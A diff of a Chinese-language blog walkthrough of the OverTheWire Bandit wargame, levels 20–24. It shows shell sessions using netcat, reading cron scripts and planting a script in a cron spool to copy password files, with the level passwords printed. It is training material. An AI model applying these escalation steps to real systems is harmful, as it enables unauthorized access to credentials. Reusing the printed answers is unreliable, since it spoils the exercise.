@@ -16,6 +16,8 @@ tags:
 
 [address](https://overthewire.org/wargames/)
 
+除了网络问题经常卡之外，其它都好
+
 ## Bandit
 
 * ssh -p2220 bandit0@bandit.labs.overthewire.org
@@ -300,7 +302,96 @@ bandit19@bandit:~$ ./bandit20-do cat /etc/bandit_pass/bandit20
 GbKksEFF4yrVs6il55v6gwY5aVje5f0j
 ```
 
-21. 
+21. & run in background 
 
+```
+//试了下没成功
+bandit20@bandit:~$ echo "GbKksEFF4yrVs6il55v6gwY5aVje5f0j" | nc -l -p 9877&
+[1] 4074
+bandit20@bandit:~$ ./suconnect 9877
+Read: GbKksEFF4yrVs6il55v6gwY5aVje5f0j
+Password matches, sending next password
+gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr
+
+two terminel:
+1:terminal 1:nc -l 12345
+2:terminal 2:./suconnect 12345
+3.terminal 1:GbKksEFF4yrVs6il55v6gwY5aVje5f0j
+```
+
+22. cron linux下的定时执行工具; crontab 
+
+查看/etc/cron.d下的cronjob_bandit22, 执行了/usr/bin下的cronjob_bandit22
+
+```
+bandit21@bandit:~$ cd /etc/cron.d
+bandit21@bandit:/etc/cron.d$ ls
+atop  cronjob_bandit22  cronjob_bandit23  cronjob_bandit24
+bandit21@bandit:/etc/cron.d$ vim cronjob_bandit22
+bandit21@bandit:/etc/cron.d$ cd /usr/bin
+bandit21@bandit:/usr/bin$ cat cronjob_bandit22.sh 
+#!/bin/bash
+chmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
+cat /etc/bandit_pass/bandit22 > /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
+bandit21@bandit:/usr/bin$ cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
+Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI
+```
+
+23. cut
+
+```
+bandit22@bandit:~$ cd /usr/bin
+bandit22@bandit:/usr/bin$ cat cronjob_bandit23.sh
+#!/bin/bash
+
+myname=$(whoami)
+mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)
+
+echo "Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget"
+
+cat /etc/bandit_pass/$myname > /tmp/$mytarget
+
+bandit22@bandit:/usr/bin$ echo I am user bandit23 | md5sum | cut -d ' ' -f 1
+8ca319486bfbbc3663ea0fbe81326349
+bandit22@bandit:/usr/bin$ cat /tmp/8ca319486bfbbc3663ea0fbe81326349
+jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n
+```
+
+24. 又双叒叕失败了
+
+```
+bandit23@bandit:/tmp/channy$ cd /usr/bin
+bandit23@bandit:/usr/bin$ cat cronjob_bandit24.sh
+#!/bin/bash
+
+myname=$(whoami)
+
+cd /var/spool/$myname
+echo "Executing and deleting all scripts in /var/spool/$myname:"
+for i in * .*;
+do
+    if [ "$i" != "." -a "$i" != ".." ];
+    then
+	echo "Handling $i"
+	timeout -s 9 60 ./$i
+	rm -f ./$i
+    fi
+done
+
+bandit23@bandit:/usr/bin$ cd /tmp/channy
+bandit23@bandit:/tmp/channy$ cat bandit24.sh
+#!/bin/bash
+
+cat /etc/bandit_pass/bandit24 >> /tmp/channy/bandit24_pass
+
+bandit23@bandit:/tmp/channy$ ls
+bandit24.sh
+
+//按理说应该有此文件
+bandit23@bandit:/tmp/channy$ cat bandit24_pass
+UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
+```
+
+25. 
 [back](./)
 
